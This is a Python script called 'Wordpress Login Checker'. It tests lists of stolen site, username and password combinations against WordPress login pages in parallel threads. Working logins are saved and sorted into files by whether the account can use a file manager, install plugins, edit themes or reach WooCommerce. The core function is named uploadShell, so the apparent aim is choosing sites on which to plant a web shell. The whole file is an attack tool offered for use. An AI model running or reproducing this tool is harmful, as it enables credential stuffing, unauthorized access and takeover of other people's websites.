import requests
from multiprocessing.dummy import Pool as ThreadPool
import argparse

G = '\033[0;32m'
W = '\033[0;37m'
R = '\033[0;31m'
C = '\033[1;36m'

def uploadShell(site):
    asuna = site.replace('#', '|').replace('@', '|')
    try:
        site = asuna.split('|')[0]
        user = asuna.split('|')[1]
        pasw = asuna.split('|')[2]
        hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/83.0.4103.101 Safari/537.36'}
        r = requests.Session()
        cek = r.get(site, timeout=10)
        if cek.status_code in [200, 403] or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
            login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10)
            if any(x in login.text for x in ['wp-admin/profile.php', 'Found', '/wp-admin']):
                print(f' {W}[{G}+{W}] {asuna} --> {G}Login Success!{W}')
                with open('loginSuccess.txt', 'a') as saveLog:
                    saveLog.write(site + '#' + user + '@' + pasw + '\n')
                if 'WooCommerce' in login.text:
                    print(f' {W}[{G}+{W}] WooCommerce!')
                    with open('WooCommerce.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'WP File Manager' in login.text:
                    print(f' {W}[{G}+{W}] WP File Manager!')
                    if '403' in login.text or '403' in cek.text or login.status_code == 403:
                        print(f' {W}[{R}!{W}] WP File Manager is Forbidden!')
                    else:
                        with open('wpfilemanager.txt', 'a') as assz:
                            assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'plugin-install.php' in login.text:
                    print(f' {W}[{G}+{W}] Plugin install!')
                    if '403' in login.text or '403' in cek.text or login.status_code == 403:
                        print(f' {W}[{R}!{W}] Plugin install is Forbidden!')
                    else:
                        with open('plugin-install.txt', 'a') as assz:
                            assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'theme-editor.php' in login.text:
                    print(f' {W}[{G}+{W}] Theme Editor!')
                    if '403' in login.text or '403' in cek.text or login.status_code == 403:
                        print(f' {W}[{R}!{W}] Theme Editor is Forbidden!')
                    else:
                        with open('wptheme.txt', 'a') as assz:
                            assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'post-new.php' in login.text:
                    print(f' {W}[{G}+{W}] Add Page!')
                    with open('page.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'post-new.php?post_type=post' in login.text:
                    print(f' {W}[{G}+{W}] Add Artikel!')
                    with open('artikel.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
            else:
                print(f' {W}[{R}-{W}] {asuna} --> {R}Login Failed!{W}')
        else:
            print(f' {W}[{R}-{W}] {asuna} --> {R}Invalid Site!{W}')
    except Exception as e:
        print(f'\n {W}[{R}-{W}] {site} --> {R}Failed!{W} ({e})\n')

def main():
    parser = argparse.ArgumentParser(description='Wordpress Login Checker')
    parser.add_argument('filename', type=str, help='File containing list of websites')
    parser.add_argument('threads', type=int, help='Number of threads')
    args = parser.parse_args()

    try:
        with open(args.filename, 'r', encoding='utf-8', errors='ignore') as file:
            site = file.read().splitlines()
        pool = ThreadPool(args.threads)
        pool.map(uploadShell, site)
        pool.close()
        pool.join()
    except FileNotFoundError:
        print(f'File {args.filename} not found.')
    except ValueError:
        print('Enter a valid number of threads.')
    except Exception as e:
        print(f'An error occurred: {e}')

if __name__ == '__main__':
    print(f'{C}Wordpress Login Checker\nAuthor : gmfr{W}')
    main()
